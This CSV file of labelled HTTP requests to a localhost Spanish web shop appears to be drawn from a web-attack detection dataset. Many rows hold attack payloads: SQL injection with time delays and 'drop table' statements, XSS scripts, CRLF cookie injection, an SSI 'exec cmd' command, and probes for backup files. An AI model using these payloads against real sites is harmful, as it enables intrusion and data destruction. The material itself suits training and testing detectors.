,request,label
143,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ohio&pwda=acerrador&remember=off&b1=entrar,1
144,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nyberg&password=predicha&nombre=carmina&apellidos=serarols+ginesta&email=redford2@enlanzarote.com.cz&dni=80243620r&direccion=zumel+s/n,+&ciudad=mas+de+barberans&cp=05420&provincia=zamora&ntca=5782200649154235&b1=registrar",1
145,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terryl&password=des9erco&nombre=haroid&apellidos=dawaher&email='injected_param&dni=14559882p&direccion=c/+doctor+francisco+saiz+sanz,+159,+&ciudad=alberca,+la&cp=03770&provincia=salamanca&ntc=3772824400880183&b1=registrar",1
146,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=365&b1=pasar+por+caja,1
147,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=ra�l&apellidosa=esterric+bou&email=munshin@cirugiaplasticacordoba.hk&dni=42473286z&direccion=avda.+sanlucar+de+barrameda+78+5-b&ciudad=alcaraz&cp=40291&provincia=huesca&ntc=4538972829961563&b1=registrar,1
148,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&b1=pasar+por+caja/,1
149,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/,1
150,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heleen&pwd=castella8ismo&remember=on&b1a=entrar,1
151,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1=a�adir+al+carrito';waitfor+delay+'0:0:15';--,1
152,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=perceval&password=0er,0lle31&nombre=parmenio&apellidos=d'molino+bocas&email=jay@almascanarias.wf&dni=96398598d&direccion=lepant+33,+&ciudad=benuza&cp=26560&provincia=guadalajara&ntc=2171179152751946&b1=registrar",1
153,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=patricio&pwd=galo1he0o&remember=offbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&b1=entrar,1
154,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winona&password=pic�n&nombre=nayla&apellidos=torre+xu&email=hyer_longdon0@artforall.mc&dni=83627503d','0','0','0');waitfor+delay+'0:0:15';--&direccion=calle+corbina,+100+&ciudad=hornillos+de+cameros&cp=46691&provincia=cuenca&ntc=5175565918974704&b1=registrar",1
155,gethttp://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp.inc,1
156,gethttp://localhost:8080/tienda1/imagenes/2.gif/4861362529278789730.bak,1
157,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro@40&login=tech4&password=mosqui-tero&nombre=rendor&apellidos=sennacherribbo+castelan&email=peake@devuelos.mx&dni=32201886t&direccion=carretera+general+de+la+laguna,+39+3?d&ciudad=aldeanueva+del+camino&cp=09143&provincia=segovia&ntc=8941990711802525&b1=registrar",1
158,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnally&pwd=entr,onera,r&remember=on&b1=entrar",1
159,gethttp://localhost:8080/tienda1/miembros.inc,1
160,gethttp://localhost:8080/tienda1/6909030637832563290.jsp~,1
161,gethttp://localhost:8080/tienda1/miembros/salir.jsp.inc,1
162,gethttp://localhost:8080/samples/sampsite/catalog.htm,1
163,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gerhardt8&password=pizmie+nta&nombre=yamila&apellidos=cardalliaguet+yescas&email=armantel@laspruebascongaseosa.vg&dni=65724136a&direccion=castro+canseco+8+5?h&ciudad=oria&cp=4351a&provincia=albacete&ntc=2877016523183053&b1=registrar,1
164,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3532&b1a=pasar+por+caja,1
165,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ba?b,bie&password=esot�r2ca&nombre=fede&apellidos=romera+zuleta&email=dacgnault@ajuntamentbarcelona2-0.name&dni=34382308e&direccion=c/+cuellar+177+&ciudad=albalate+de+las+nogueras&cp=24915&provincia=segovia&ntc=8975566519527853&b1=registrar",1
166,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&b1a=confirmar,1
167,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=lorli&pwd=guipuscoano&remember=on&b1=entrar,1
168,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=hernan&pwd=buscada&remember=on&b1=entrar,1
169,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
170,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precioa=39&cantidad=58&b1=a�adir+al+carrito,1
171,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=*du'cic&password=c0855m05l13&nombre=rachid&apellidos=specie&email=tansey@cohel.tel&dni=85978887b&direccion=c/+uruguay,+17,+&ciudad=sitges&cp=08840&provincia=salamanca&ntc=2191408173155775&b1=registrar",1
172,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lrcrtp&password=a9oma39e&nombre=angelo&apellidos=merinas&email=ramo@whitehat.py&dni=17048909k&direccion=rafael+orozco+141+12?h&ciudad=valga��n&cp=';waitfor+delay+'0:0:15';--&provincia=huesca&ntc=1343607497132758&b1=registrar,1
173,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
174,gethttp://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif.old,1
175,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39%7c&cantidad=59&b1=a�adir+al+carrito,1
176,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidada=69&b1=a�adir+al+carrito,1
177,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%2b,1
178,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cad'y&pwd=af73o76fad8&remember=off&b1=entrar,1
179,gethttp://localhost:8080.java,1
180,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=85&cantidad=43&b1=a�adir+al+carrito,1
181,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%0aset-cookie%3a+tamper%3d1041264011025374727,1
182,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5191&b1=confirmar/,1
183,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
184,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=satkamp&password=6asc5oso&nombre=n�lida&apellidos=+&email=hurst@guejos.iq&dni=91086664v&direccion=callejon+cinco+minutos,+31+6?d&ciudad=sieteiglesias+de+tormes&cp=40355&provincia=vizcaya&ntc=5805357208824154&b1=registrar",1
185,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=vino+rioja&precio=100&cantidad=68&b1=a�adir+al+carrito,1
186,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1=a�adir+al+carrito,1
187,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9682&b1a=confirmar,1
188,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gowl&pwd=mentirilla&remember=off/&b1=entrar,1
189,gethttp://localhost:8080/tienda1/publico/registro.jsp/asf-logo-wide.gif.bak,1
190,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
191,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=?&b1=a�adir+al+carrito,1
192,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lac+oss??e&pwd=intempesti+vo&remember=on&b1=entrar,1
193,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
194,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leupold&password=f8i73a&nombrea=rogaciano&apellidos=huasupoma+llobera&email=florath_cochran@hiperzaragoza.aq&dni=42620172e&direccion=c/+sagrados+corazones+27,+7?a&ciudad=villalbilla+de+gumiel&cp=10230&provincia=zamora&ntc=1281104729948051&b1=registrar",1
195,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8360&b1=pasar+por+caja/,1
196,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=87'+delete+from+users&b1=a�adir+al+carrito,1
197,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico%20&precio=85&cantidad=21&b1=a�adir+al+carrito,1
198,gethttp://localhost:8080/tienda1/global/estilos.css.old,1
199,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
200,gethttp://localhost:8080/msadc/samples/selector/showcode.asp,1
201,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heeralal0&pwda=mi�arse&remember=off&b1=entrar,1
202,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=markland&password=6os878rn8&nombre=nolsaco&apellidos=zarzalejo+vendrell&email=coulson.koster@lasiestacreativa.ph&dni=17456236h&direccion=plza.+de+los+jardinillos+75,+&ciudad=esguevillas+de+esgueva&cp=34757&provincia=a+coru�a&ntca=2659545873561160&b1=registrar",1
203,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dautenha&password=bar50neg07&nombre=le�n&apellidos=obreg�n+sagues&emaila=penot.riesgo@casabolsa43.nl&dni=45104511q&direccion=calle+santa+esperan�a+120+&ciudad=j�vea/x�bia&cp=09345&provincia=valencia&ntc=7982161253560124&b1=registrar,1
204,gethttp://localhost:8080/tienda1/imagenes/4861362529278789730.inc,1
205,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=%3f&cantidad=85&b1=a�adir+al+carrito,1
206,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=charness4&password=453a�eg6&nombre=prisciano&apellidos=villalon+castanyer&email=caragiu@blogsmegumi.de&dni=20808666z&direccion=calle+fernando+h.+guzman,+88+12?g&ciudad=vilanova+de+la+ba?rca&cp=08619&provincia=tarragona&ntc=0673547824413217&b1=registrar",1
207,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=wassim&password=matach�n&nombrea=frida&apellidos=ramenghi+zachrisson&email=decorsica_altenhaus@muchachina.ie&dni=93484863y&direccion=los+arrastres+124,+&ciudad=san+mart�n+de+unx&cp=48940&provincia=madrid&ntc=8940491732562481&b1=registrar",1
208,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mirabell&password=implicante','0');waitfor+delay+'0:0:15';--&nombre=yayn&apellidos=boliart+jubert&email=karlatos-woodcroft@joyaseleccion.fr&dni=90456703a&direccion=avenida+vigo+194+&ciudad=olula+de+castro&cp=07195&provincia=cuenca&ntc=6879168763922210&b1=registrar",1
209,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=jam�n+ib�rico&precio=39&cantidad=78&b1=a�adir+al+carrito,1
210,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=82'injected_param&b1=a�adir+al+carrito,1
211,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=modestin&pwd=es'pec'ia/l&remember=off&b1=entrar,1
212,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/6909030637832563290.jsp,1
213,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro<script>alert(""paros"");</script>&login=widuch&password=o7top�dica&nombre=belindo&apellidos=calet&email=gassman@itrends.gs&dni=54927886e&direccion=memorial+nu�ez+blanca+193,+&ciudad=madridanos&cp=37060&provincia=teruel&ntc=0916374019101201&b1=registrar",1
214,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=39/&cantidad=28&b1=a�adir+al+carrito,1
215,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rivera&passworda=tecno6�g5ca&nombre=nerio&apellidos=burrueco&email=kovats@hotelsardegna.asia&dni=96138987e&direccion=c/+pintors+vergos,+115,+&ciudad=sen�s&cp=31657&provincia=zaragoza&ntc=7852313065954074&b1=registrar",1
216,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n'+ib�ric-'o&precio=100&cantidad=43&b1=a�adir+al+carrito,1
217,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=apollo&pwd=n79t,300471&remember=off&b1=entrar",1
218,puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4014&b1=pasar+por+caja,1
219,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=herak&password=v1373948c6a&nombre=malinda&apellidos=diclo+ornosa&email=schull@cursosenlaplaya.ro&dni=43008564j&direccion=pasaje+arcillero,+177,+2?g&ciudad=pedrosa+del+rey&cp=37874&provincia=cuenca&ntca=3359754319393302&b1=registrar",1
220,gethttp://localhost:8080/tienda1/imagenes/1.gif/6909030637832563290.jsp.inc,1
221,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
222,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas%2b,1
223,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+,1
224,gethttp://localhost:8080/samples/isapi/isapi.htm,1
225,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
226,gethttp://localhost:8080/tienda1/publico/pagar.jsp/~,1
227,gethttp://localhost:8080/tienda1/publico/pagar.jsp/.old,1
228,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=ker&pwd=pre7u5t05a&remember=off&b1=entrar,1
229,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
230,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro@40&login=jagath&password=azorr1rse&nombre=sili&apellidos=maslo+arrunategui&email=davray.chayevsky4@sierradealcaraz.um&dni=97290360s&direccion=c/+galindez+de+carvajal,+27+&ciudad=san+miguel+de+serrezuela&cp=09692&provincia=le�n&ntc=8772164486474313&b1=registrar",1
231,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1885+&b1=pasar+por+caja,1
232,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=levis&pwd=8scualide6&remember=off&b1=entrar,1
233,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidada=47&b1=a�adir+al+carrito,1
234,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarparos%22%20style=%22background:url(javascript:alert('paros'))&precio=5514&b1=pasar+por+caja,1
235,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=clark-st&password=4a4r5r&nombre=semiramis&apellidos=chapi+vieira&email=tirard_lamore@biosoftware.cv&dni=88665105j&direccion=calle+miguel+romero+matinez+s/n,+&ciudad=sayalonga&cp=09227&provincia=l?a+ri?oj*a&ntc=2618138569718823&b1=registrar",1
236,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1980&b1=confirmar/,1
237,gethttp://localhost:8080~,1
238,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�ricoparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&precio=39&cantidad=48&b1=a�adir+al+carrito,1
239,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide,1
240,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=calow&pwd=ensa�ada&remember=on&b1=entrar|,1
241,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nevinbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&pwd=desgraduar&remember=on&b1=entrar,1
242,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sherri&password=adj9d8cat0r55&nombre=amaru&apellidos=gilabert&email=chimento@fuzzy.bb&dni=66365789w&direccion=plaza+doctor+quemada+88+8-h%00&ciudad=castrocalb�n&cp=19268&provincia=asturias&ntc=3607118257162367&b1=registrar,1
243,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0');waitfor+delay+'0:0:15';--",1
244,gethttp://localhost:8080/servlet/hello,1
245,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmira&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=calle+jose+luis+de+arrese,+105+1?f&ciudad=ger&cp=24370&provincia=cantabria&ntca=7563981891605435&b1=registrar",1
246,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=uunko7&password=chopal&nombre=tr�nsito&apellidos=montemayor+lillo&email=bagdasarian@lola-lutscht.pe&dni=88623470p&direccion=carrer+trieta+125+&ciudad=calles&cp=25440&provincia=teruel&ntc=%2b&b1=registrar,1
247,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4135&b1a=pasar+por+caja,1
248,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito?,1
249,gethttp://localhost:8080/iisadmpwd/aexp4.htr,1
250,gethttp://localhost:8080/iisadmpwd/aexp2b.htr,1
251,gethttp://localhost:8080/tienda1/imagenes/2.gif/.inc,1
252,gethttp://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide.inc,1
253,gethttp://localhost:8080/tienda1.inc,1
254,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7924&b1=pasar+por+caja/,1
255,gethttp://localhost:8080/tienda1.bak,1
256,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=1&b1a=a�adir+al+carrito,1
257,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&remember=on&b1=entrar,1
258,puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melfi&pwd=c8r4e9a&remember=on&b1=entrar,1
259,"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1','0','0','0');waitfor+delay+'0:0:15';--",1
260,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=reiser&password=fi33�8841&nombre=palmira&apellidos=rocha+pello&email=terry-lewis.macdougall@ofertaschinas.gd&dnia=46644989t&direccion=calle+los+hotelitos+s/n,+&ciudad=alforja&cp=06200&provincia=madrid&ntc=6898289931368660&b1=registrar",1
261,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%20&precio=7651&b1=confirmar,1
262,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7095&b1=confirmar/,1
263,gethttp://localhost:8080/tienda1/global/titulo.jsp.java,1
264,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4184&b1=confirmarany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a,1
265,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=moniek&pwda=matalah�va&remember=off&b1=entrar,1
266,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=felicity&password=bo9510c8951vo&nombre=deodato&apellidos=treig+bonitto&email=roo@didacramirez.kn&dni=42952758m&direccion=lora+64,+&ciudad=villanueva+de+teba&cp=0930a&provincia=valladolid&ntc=8769540261854446&b1=registrar",1
267,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marceau&password=gallofar&nombre=reese&apellidos=echevarr�a+borras&email=shafer@comodindelhogar.ps&dni=91669228z&direccion=calle+ciudad+real+70+&ciudad=*ze?.rain&cp=18110&provincia=le�n&ntc=5498019386579273&b1=registrar,1
268,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%00,1
269,gethttp://localhost:8080/tienda1/publico/autenticar.jsp.old,1
270,gethttp://localhost:8080/samples/gbook/register.htm,1
271,gethttp://localhost:8080/_vti_log/,1
272,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
273,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=giuliett5&password=2an6'2/0�a&nombre=ronald&apellidos=sanz&email=stantley@apagado.com.cn&dni=95645025p&direccion=modolell+91,+9-f&ciudad=hu�neja&cp=27532&provincia=c�rdoba&ntc=2095402287087000&b1=registrar",1
274,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=47&b1a=a�adir+al+carrito,1
275,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crowder&password=*huer8o&nombre=cesaria&apellidos=estruch+guixa&email=ebersole.finney@mauroman.cr&dni=83100561c&direccion=pla�a+mossen+geis,+115+4?c&ciudada=porri�o,+o&cp=18520&provincia=c�ceres&ntc=8256741675769162&b1=registrar",1
276,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shiranth5&password=petal9192&nombre=nelma&apellidos=rayo+jal�n&email=dubucourt-geoffrey@intercambioenlaces.name&dni=7b0b624b341n&direccion=pla�a+d'+espanya+36+6-e&ciudad=penagos&cp=10240&provincia=m�laga&ntc=1634165251818381&b1=registrar,1
277,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hi'lwa&pwd=4nconstanc01&remember=on&b1=entrar,1
278,gethttp://localhost:8080/tienda1/imagenes/2.gif/4861362529278789730,1
279,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar+&login=vivek&pwd=muletillera&remember=on&b1=entrar,1
280,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=poliwoda&password=enigmatista&nombre=tarciano&apellidos=cam�+tordera&email=nardo@codwatw.lk&dni=08762650h&direccion=federico+landrove+moi�o+105+3-g&ciudad=goizueta&cp=19360&provincia=alicanteparos%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&ntc=7171983347621063&b1=registrar,1
281,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiuhuai4&password=renombrada&nombre=vasty&apellidos=aceituno+masdevall&email=ronoro_dalya@foreignoffice.nu&dni=48258022c&direccion=via+apicola+45,+4?c&ciudad=santa+mar�a+de+sando&cp=47182&provincia=salamanca&ntca=9198580449925150&b1=registrar",1
282,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=danforth7&password=p�0o7i&nombre=liana&apellidos=crivill�+van+derdys&email=lunge@showcars@madri@d@.aero&dni=70627754k&direccion=calle+rosal,+42+4?d&ciudad=casas+de+don+antonio&cp=17780&provincia=segovia&ntc=8272734810678085&b1=registrar",1
283,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shein&password=e1bo5c62&nombre=alexia&apellidos=lorente+vairo&email=gozier@callalelaboca.bz&dni=48475570b&direccion=joncar+23,+&ciudad=villa+verde+de+*+medina&cp=45525&provincia=madrid&ntc=2914128160766490&b1=registrar",1
284,gethttp://localhost:8080/tienda1/.old,1
285,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
286,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hauersto&pwd=angel�n&remember=on/&b1=entrar,1
287,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1754&b1=confirmar/,1
288,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoparos%22%20style=%22background:url(javascript:alert('paros')),1
289,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=82&b1=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a,1
290,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modoa=registro&login=program&password=9bocelado&nombre=kasuhiro&apellidos=argando�a+cobo&email=dufour_mannhardt@privatebanking.com.us&dni=33671238c&direccion=ayuntamiento,+88,+&ciudad=ruanes&cp=34191&provincia=navarra&ntc=8395803626511609&b1=registrar",1
291,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
292,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
293,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=levon&pwd=ca�ucela%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&remember=on&b1=entrar,1
294,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=detlef6&password=garr�n&nombre=vigilio&apellidos=alcantara+campanin&email=padamsee@comodindelhogar.no&dni=71599604y&direccion=c/+san+xoan+115+&ciudad=cigu�uela&cp=0529a&provincia=palencia&ntc=7263738765493624&b1=registrar,1
295,gethttp://localhost:8080/travelnet/home.jsp,1
296,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/,1
297,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=espinosa&pwd=candado&remember=<!--#exec+cmd=""ls+/""-->&b1=entrar",1
298,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=koolstra&password=ordenante&nombre=ivo&apellidos=herrero+barberis&email=briers.lester@decsl.pt&dni=56149521n&direccion=av.+valdecilla,+86+&ciudad=cheste&cp=1247a&provincia=tarragona&ntc=0452979446378052&b1=registrar",1
299,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=seyfolla&pwd=c85o'7rer6&remember=on&b1=entrar,1
300,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39/&cantidad=18&b1=a�adir+al+carrito,1
301,gethttp://localhost:8080/tienda1/global/menum.jsp~,1
302,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=foster&pwd=8se7i961o&remember=off&b1=entrarany%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
303,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ivanyi0&password=va7e9ianato&nombre=crescencio&apellidos=echevarr�a+borras&email=tadio.bixby@espaciopintor.eh&dni=98763423c&direccion=torrent+de+can+quintana,+179,+&ciudad=llocnou+de+la+corona&cp=49430&provincia=lleida&ntca=8110791105529474&b1=registrar",1
304,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=2&nombre=queso+manchego&precio=85&cantidad=20&b1=a�adir+al+carrito,1
305,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1','0','0');waitfor+delay+'0:0:15';--&nombre=queso+manchego&precio=100&cantidad=5&b1=a�adir+al+carrito",1
306,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasset-cookie%3a+tamper%3d1041264011025374727,1
307,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
